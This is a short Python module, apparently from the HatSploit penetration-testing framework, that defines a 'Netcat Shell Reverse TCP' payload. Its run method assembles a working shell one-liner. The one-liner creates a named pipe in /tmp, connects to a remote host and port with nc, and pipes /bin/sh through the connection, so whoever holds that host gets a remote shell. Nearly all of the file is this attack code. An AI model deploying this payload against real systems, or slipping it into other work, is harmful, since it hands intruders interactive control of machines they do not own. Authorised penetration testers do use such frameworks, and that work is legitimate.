#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload

from pex.string import String


class HatSploitPayload(Payload, String):
    details = {
        'Category': "singler",
        'Name': "Netcat Shell Reverse TCP",
        'Payload': "unix/generic/netcat_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Netcat shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        filename = self.random_string(8)
        payload = f"mkfifo /tmp/{filename}; nc {remote_host} {remote_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"

        return payload
